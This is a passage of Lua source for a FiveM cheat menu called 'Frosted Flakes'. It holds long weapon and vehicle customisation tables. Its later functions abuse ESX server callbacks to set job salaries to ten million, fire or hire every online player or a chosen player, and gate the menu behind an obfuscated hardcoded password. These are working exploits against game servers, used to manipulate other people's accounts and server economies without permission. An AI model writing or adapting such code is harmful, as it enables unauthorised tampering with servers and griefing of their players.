                        id = 'COMPONENT_AT_SCOPE_LARGE'
                    },
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        HeavySniper = {
            id = 'weapon_heavysniper',
            name = '~h~~r~> ~s~Heavy Sniper',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE'
                    },
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                }
            }
        },
        HeavySniperMkII = {
            id = 'weapon_heavysniper_mk2',
            name = '~h~~r~> ~s~Heavy Sniper Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Armor Piercing Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'
                    },
                    {
                        name = '~h~~r~> ~s~Explosive Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    },
                    {
                        name = '~h~~r~> ~s~Nigt Vision Scope',
                        id = 'COMPONENT_AT_SCOPE_NV'
                    },
                    {
                        name = '~h~~r~> ~s~Thermal Scope',
                        id = 'COMPONENT_AT_SCOPE_THERMAL'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SR_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~r~> ~s~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    },
                    {
                        name = '~h~~r~> ~s~Bell-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_09'
                    }
                }
            }
        },
        MarksmanRifle = {
            id = 'weapon_marksmanrifle',
            name = '~h~~r~> ~s~Marksman Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        MarksmanRifleMkII = {
            id = 'weapon_marksmanrifle_mk2',
            name = '~h~~r~> ~s~Marksman Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_MRFL_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_MRFL_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~r~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        }
    },
    Heavy = {
        RPG = {
            id = 'weapon_rpg',
            name = '~h~~r~> ~s~RPG',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncher = {
            id = 'weapon_grenadelauncher',
            name = '~h~~r~> ~s~Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncherSmoke = {
            id = 'weapon_grenadelauncher_smoke',
            name = '~h~~r~> ~s~Grenade Launcher Smoke',
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {
            id = 'weapon_minigun',
            name = '~h~~r~> ~s~Minigun',
            bInfAmmo = false,
            mods = {}
        },
        FireworkLauncher = {
            id = 'weapon_firework',
            name = '~h~~r~> ~s~Firework Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Railgun = {
            id = 'weapon_railgun',
            name = '~h~~r~> ~s~Railgun',
            bInfAmmo = false,
            mods = {}
        },
        HomingLauncher = {
            id = 'weapon_hominglauncher',
            name = '~h~~r~> ~s~Homing Launcher',
            bInfAmmo = false,
            mods = {}
        },
        CompactGrenadeLauncher = {
            id = 'weapon_compactlauncher',
            name = '~h~~r~> ~s~Compact Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {
            id = 'weapon_rayminigun',
            name = '~h~~r~> ~s~Widowmaker',
            bInfAmmo = false,
            mods = {}
        }
    },
    Throwables = {
        Grenade = {
            id = 'weapon_grenade',
            name = '~h~~r~> ~s~Grenade',
            bInfAmmo = false,
            mods = {}
        },
        BZGas = {
            id = 'weapon_bzgas',
            name = '~h~~r~> ~s~BZ Gas',
            bInfAmmo = false,
            mods = {}
        },
        MolotovCocktail = {
            id = 'weapon_molotov',
            name = '~h~~r~> ~s~Molotov Cocktail',
            bInfAmmo = false,
            mods = {}
        },
        StickyBomb = {
            id = 'weapon_stickybomb',
            name = '~h~~r~> ~s~Sticky Bomb',
            bInfAmmo = false,
            mods = {}
        },
        ProximityMines = {
            id = 'weapon_proxmine',
            name = '~h~~r~> ~s~Proximity Mines',
            bInfAmmo = false,
            mods = {}
        },
        Snowballs = {
            id = 'weapon_snowball',
            name = '~h~~r~> ~s~Snowballs',
            bInfAmmo = false,
            mods = {}
        },
        PipeBombs = {
            id = 'weapon_pipebomb',
            name = '~h~~r~> ~s~Pipe Bombs',
            bInfAmmo = false,
            mods = {}
        },
        Baseball = {
            id = 'weapon_ball',
            name = '~h~~r~> ~s~Baseball',
            bInfAmmo = false,
            mods = {}
        },
        TearGas = {
            id = 'weapon_smokegrenade',
            name = '~h~~r~> ~s~Tear Gas',
            bInfAmmo = false,
            mods = {}
        },
        Flare = {
            id = 'weapon_flare',
            name = '~h~~r~> ~s~Flare',
            bInfAmmo = false,
            mods = {}
        }
    },
    Misc = {
        Parachute = {
            id = 'gadget_parachute',
            name = '~h~~r~> ~s~Parachute',
            bInfAmmo = false,
            mods = {}
        },
        FireExtinguisher = {
            id = 'weapon_fireextinguisher',
            name = '~h~~r~> ~s~Fire Extinguisher',
            bInfAmmo = false,
            mods = {}
        }
    }
}
local b8 = false
local b9 = false
local ba = false
local bb = false
local bc = nil
local bd = {}
local be = {}
local bf = nil
local bg = false
local bh = -1
local bi = -1
local bj = -1
local bk = false
local bl = {
    {
        name = '~h~Spoilers',
        id = 0
    },
    {
        name = '~h~Front Bumper',
        id = 1
    },
    {
        name = '~h~Rear Bumper',
        id = 2
    },
    {
        name = '~h~Side Skirt',
        id = 3
    },
    {
        name = '~h~Exhaust',
        id = 4
    },
    {
        name = '~h~Frame',
        id = 5
    },
    {
        name = '~h~Grille',
        id = 6
    },
    {
        name = '~h~Hood',
        id = 7
    },
    {
        name = '~h~Fender',
        id = 8
    },
    {
        name = '~h~Right Fender',
        id = 9
    },
    {
        name = '~h~Roof',
        id = 10
    },
    {
        name = '~h~Vanity Plates',
        id = 25
    },
    {
        name = '~h~Trim',
        id = 27
    },
    {
        name = '~h~Ornaments',
        id = 28
    },
    {
        name = '~h~Dashboard',
        id = 29
    },
    {
        name = '~h~Dial',
        id = 30
    },
    {
        name = '~h~Door Speaker',
        id = 31
    },
    {
        name = '~h~Seats',
        id = 32
    },
    {
        name = '~h~Steering Wheel',
        id = 33
    },
    {
        name = '~h~Shifter Leavers',
        id = 34
    },
    {
        name = '~h~Plaques',
        id = 35
    },
    {
        name = '~h~Speakers',
        id = 36
    },
    {
        name = '~h~Trunk',
        id = 37
    },
    {
        name = '~h~Hydraulics',
        id = 38
    },
    {
        name = '~h~Engine Block',
        id = 39
    },
    {
        name = '~h~Air Filter',
        id = 40
    },
    {
        name = '~h~Struts',
        id = 41
    },
    {
        name = '~h~Arch Cover',
        id = 42
    },
    {
        name = '~h~Aerials',
        id = 43
    },
    {
        name = '~h~Trim 2',
        id = 44
    },
    {
        name = '~h~Tank',
        id = 45
    },
    {
        name = '~h~Windows',
        id = 46
    },
    {
        name = '~h~Livery',
        id = 48
    },
    {
        name = '~h~Horns',
        id = 14
    },
    {
        name = '~h~Wheels',
        id = 23
    },
    {
        name = '~h~Wheel Types',
        id = 'wheeltypes'
    },
    {
        name = '~h~Extras',
        id = 'extra'
    },
    {
        name = '~h~Neons',
        id = 'neon'
    },
    {
        name = '~h~Paint',
        id = 'paint'
    },
    {
        name = '~h~Headlights Color',
        id = 'headlight'
    },
    {
        name = '~h~Licence Plate',
        id = 'licence'
    }
}
local bm = {
    {
        name = '~h~~r~Engine',
        id = 11
    },
    {
        name = '~h~~b~Brakes',
        id = 12
    },
    {
        name = '~h~~g~Transmission',
        id = 13
    },
    {
        name = '~h~~y~Suspension',
        id = 15
    },
    {
        name = '~h~~b~Armor',
        id = 16
    }
}
local bn = {
    {
        name = '~h~Blue on White 2',
        id = 0
    },
    {
        name = '~h~Blue on White 3',
        id = 4
    },
    {
        name = '~h~Yellow on Blue',
        id = 2
    },
    {
        name = '~h~Yellow on Black',
        id = 1
    },
    {
        name = '~h~North Yankton',
        id = 5
    }
}
local bo = {
    {
        name = '~h~Default',
        id = -1
    },
    {
        name = '~h~White',
        id = 0
    },
    {
        name = '~h~Blue',
        id = 1
    },
    {
        name = '~h~Electric Blue',
        id = 2
    },
    {
        name = '~h~Mint Green',
        id = 3
    },
    {
        name = '~h~Lime Green',
        id = 4
    },
    {
        name = '~h~Yellow',
        id = 5
    },
    {
        name = '~h~Golden Shower',
        id = 6
    },
    {
        name = '~h~Orange',
        id = 7
    },
    {
        name = '~h~Red',
        id = 8
    },
    {
        name = '~h~Pony Pink',
        id = 9
    },
    {
        name = '~h~Hot Pink',
        id = 10
    },
    {
        name = '~h~Purple',
        id = 11
    },
    {
        name = '~h~Blacklight',
        id = 12
    }
}
local bp = {
    ['Stock Horn'] = -1,
    ['Truck Horn'] = 1,
    ['Police Horn'] = 2,
    ['Clown Horn'] = 3,
    ['Musical Horn 1'] = 4,
    ['Musical Horn 2'] = 5,
    ['Musical Horn 3'] = 6,
    ['Musical Horn 4'] = 7,
    ['Musical Horn 5'] = 8,
    ['Sad Trombone Horn'] = 9,
    ['Classical Horn 1'] = 10,
    ['Classical Horn 2'] = 11,
    ['Classical Horn 3'] = 12,
    ['Classical Horn 4'] = 13,
    ['Classical Horn 5'] = 14,
    ['Classical Horn 6'] = 15,
    ['Classical Horn 7'] = 16,
    ['Scaledo Horn'] = 17,
    ['Scalere Horn'] = 18,
    ['Salemi Horn'] = 19,
    ['Scalefa Horn'] = 20,
    ['Scalesol Horn'] = 21,
    ['Scalela Horn'] = 22,
    ['Scaleti Horn'] = 23,
    ['Scaledo Horn High'] = 24,
    ['Jazz Horn 1'] = 25,
    ['Jazz Horn 2'] = 26,
    ['Jazz Horn 3'] = 27,
    ['Jazz Loop Horn'] = 28,
    ['Starspangban Horn 1'] = 28,
    ['Starspangban Horn 2'] = 29,
    ['Starspangban Horn 3'] = 30,
    ['Starspangban Horn 4'] = 31,
    ['Classical Loop 1'] = 32,
    ['Classical Horn 8'] = 33,
    ['Classical Loop 2'] = 34
}
local bq = {
    ['White'] = {
        255,
        255,
        255
    },
    ['Blue'] = {
        0,
        0,
        255
    },
    ['Electric Blue'] = {
        0,
        150,
        255
    },
    ['Mint Green'] = {
        50,
        255,
        155
    },
    ['Lime Green'] = {
        0,
        255,
        0
    },
    ['Yellow'] = {
        255,
        255,
        0
    },
    ['Golden Shower'] = {
        204,
        204,
        0
    },
    ['Orange'] = {
        255,
        128,
        0
    },
    ['Red'] = {
        255,
        0,
        0
    },
    ['Pony Pink'] = {
        255,
        102,
        255
    },
    ['Hot Pink'] = {
        255,
        0,
        255
    },
    ['Purple'] = {
        153,
        0,
        153
    }
}
local br = {
    {
        name = '~h~Black',
        id = 0
    },
    {
        name = '~h~Carbon Black',
        id = 147
    },
    {
        name = '~h~Graphite',
        id = 1
    },
    {
        name = '~h~Anhracite Black',
        id = 11
    },
    {
        name = '~h~Black Steel',
        id = 2
    },
    {
        name = '~h~Dark Steel',
        id = 3
    },
    {
        name = '~h~Silver',
        id = 4
    },
    {
        name = '~h~Bluish Silver',
        id = 5
    },
    {
        name = '~h~Rolled Steel',
        id = 6
    },
    {
        name = '~h~Shadow Silver',
        id = 7
    },
    {
        name = '~h~Stone Silver',
        id = 8
    },
    {
        name = '~h~Midnight Silver',
        id = 9
    },
    {
        name = '~h~Cast Iron Silver',
        id = 10
    },
    {
        name = '~h~Red',
        id = 27
    },
    {
        name = '~h~Torino Red',
        id = 28
    },
    {
        name = '~h~Formula Red',
        id = 29
    },
    {
        name = '~h~Lava Red',
        id = 150
    },
    {
        name = '~h~Blaze Red',
        id = 30
    },
    {
        name = '~h~Grace Red',
        id = 31
    },
    {
        name = '~h~Garnet Red',
        id = 32
    },
    {
        name = '~h~Sunset Red',
        id = 33
    },
    {
        name = '~h~Cabernet Red',
        id = 34
    },
    {
        name = '~h~Wine Red',
        id = 143
    },
    {
        name = '~h~Candy Red',
        id = 35
    },
    {
        name = '~h~Hot Pink',
        id = 135
    },
    {
        name = '~h~Pfsiter Pink',
        id = 137
    },
    {
        name = '~h~Salmon Pink',
        id = 136
    },
    {
        name = '~h~Sunrise Orange',
        id = 36
    },
    {
        name = '~h~Orange',
        id = 38
    },
    {
        name = '~h~Bright Orange',
        id = 138
    },
    {
        name = '~h~Gold',
        id = 99
    },
    {
        name = '~h~Bronze',
        id = 90
    },
    {
        name = '~h~Yellow',
        id = 88
    },
    {
        name = '~h~Race Yellow',
        id = 89
    },
    {
        name = '~h~Dew Yellow',
        id = 91
    },
    {
        name = '~h~Dark Green',
        id = 49
    },
    {
        name = '~h~Racing Green',
        id = 50
    },
    {
        name = '~h~Sea Green',
        id = 51
    },
    {
        name = '~h~Olive Green',
        id = 52
    },
    {
        name = '~h~Bright Green',
        id = 53
    },
    {
        name = '~h~Gasoline Green',
        id = 54
    },
    {
        name = '~h~Lime Green',
        id = 92
    },
    {
        name = '~h~Midnight Blue',
        id = 141
    },
    {
        name = '~h~Galaxy Blue',
        id = 61
    },
    {
        name = '~h~Dark Blue',
        id = 62
    },
    {
        name = '~h~Saxon Blue',
        id = 63
    },
    {
        name = '~h~Blue',
        id = 64
    },
    {
        name = '~h~Mariner Blue',
        id = 65
    },
    {
        name = '~h~Harbor Blue',
        id = 66
    },
    {
        name = '~h~Diamond Blue',
        id = 67
    },
    {
        name = '~h~Surf Blue',
        id = 68
    },
    {
        name = '~h~Nautical Blue',
        id = 69
    },
    {
        name = '~h~Racing Blue',
        id = 73
    },
    {
        name = '~h~Ultra Blue',
        id = 70
    },
    {
        name = '~h~Light Blue',
        id = 74
    },
    {
        name = '~h~Chocolate Brown',
        id = 96
    },
    {
        name = '~h~Bison Brown',
        id = 101
    },
    {
        name = '~h~Creeen Brown',
        id = 95
    },
    {
        name = '~h~Feltzer Brown',
        id = 94
    },
    {
        name = '~h~Maple Brown',
        id = 97
    },
    {
        name = '~h~Beechwood Brown',
        id = 103
    },
    {
        name = '~h~Sienna Brown',
        id = 104
    },
    {
        name = '~h~Saddle Brown',
        id = 98
    },
    {
        name = '~h~Moss Brown',
        id = 100
    },
    {
        name = '~h~Woodbeech Brown',
        id = 102
    },
    {
        name = '~h~Straw Brown',
        id = 99
    },
    {
        name = '~h~Sandy Brown',
        id = 105
    },
    {
        name = '~h~Bleached Brown',
        id = 106
    },
    {
        name = '~h~Schafter Purple',
        id = 71
    },
    {
        name = '~h~Spinnaker Purple',
        id = 72
    },
    {
        name = '~h~Midnight Purple',
        id = 142
    },
    {
        name = '~h~Bright Purple',
        id = 145
    },
    {
        name = '~h~Cream',
        id = 107
    },
    {
        name = '~h~Ice White',
        id = 111
    },
    {
        name = '~h~Frost White',
        id = 112
    }
}
local bs = '~w~Frosted Flakes'
local bt = {
    {
        name = '~h~Black',
        id = 12
    },
    {
        name = '~h~Gray',
        id = 13
    },
    {
        name = '~h~Light Gray',
        id = 14
    },
    {
        name = '~h~Ice White',
        id = 131
    },
    {
        name = '~h~Blue',
        id = 83
    },
    {
        name = '~h~Dark Blue',
        id = 82
    },
    {
        name = '~h~Midnight Blue',
        id = 84
    },
    {
        name = '~h~Midnight Purple',
        id = 149
    },
    {
        name = '~h~Schafter Purple',
        id = 148
    },
    {
        name = '~h~Red',
        id = 39
    },
    {
        name = '~h~Dark Red',
        id = 40
    },
    {
        name = '~h~Orange',
        id = 41
    },
    {
        name = '~h~Yellow',
        id = 42
    },
    {
        name = '~h~Lime Green',
        id = 55
    },
    {
        name = '~h~Green',
        id = 128
    },
    {
        name = '~h~Forest Green',
        id = 151
    },
    {
        name = '~h~Foliage Green',
        id = 155
    },
    {
        name = '~h~Olive Darb',
        id = 152
    },
    {
        name = '~h~Dark Earth',
        id = 153
    },
    {
        name = '~h~Desert Tan',
        id = 154
    }
}
local bu = {
    {
        name = '~h~Brushed Steel',
        id = 117
    },
    {
        name = '~h~Brushed Black Steel',
        id = 118
    },
    {
        name = '~h~Brushed Aluminum',
        id = 119
    },
    {
        name = '~h~Pure Gold',
        id = 158
    },
    {
        name = '~h~Brushed Gold',
        id = 159
    }
}
defaultVehAction = ''
if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end
local bv = false
local bw = true
local bx = GetPlayerServerId(PlayerPedId(-1))
local by = GetPlayerName(bx)
av('~o~¦~w~Frosted Flakes successfully loaded... Have Fun!', true)
local function bz(I, x, y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0, 0.4)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    AddTextComponentString(I)
    DrawText(x, y)
end

function RequestModelSync(bA)
    local bB = GetHashKey(bA)
    RequestModel(bB)
    while not HasModelLoaded(bB) do
        RequestModel(bB)
        Citizen.Wait(0)
    end
end

function EconomyDy2()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            3,
            10000000
        )
    end
end

function UnemployedPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'unemployed',
                        0,
                        'fire'
                    )
                end
            end
        )
    end
end

function AmbulancePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'ambulance',
                        3,
                        'hire'
                    )
                end
            end
        )
    end
end

function PolicePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'police',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end
local bC = 0
capPa = 'd' .. 'o' .. 'k' .. 'i'
cappA = 'd' .. 'o' .. 'k' .. 'i' .. capPa
local bD = cappA
local function bE()
    if bC == 3 then
        ForceSocialClubUpdate()
    else
        local ak = KeyboardInput('type your password', '', 100)
        if ak == bD then
            mhaonn = true
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        else
            bC = bC + 1
            PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        end
    end
end

function MecanoPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'mecano',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function RealEstateAgentPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'realestateagent',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function TaxiPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'taxi',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function CarDealerPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'cardealer',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function UnemployedPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'unemployed',
                    0,
                    'hire'
                )
            end
        )
    end
end

function CarDealerPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'cardealer',
                    3,
                    'hire'
                )
            end
        )
    end
end

function RealEstateAgentPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'realestateagent',
                    3,
                    'hire'
                )
            end
        )
    end
end

function TaxiPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
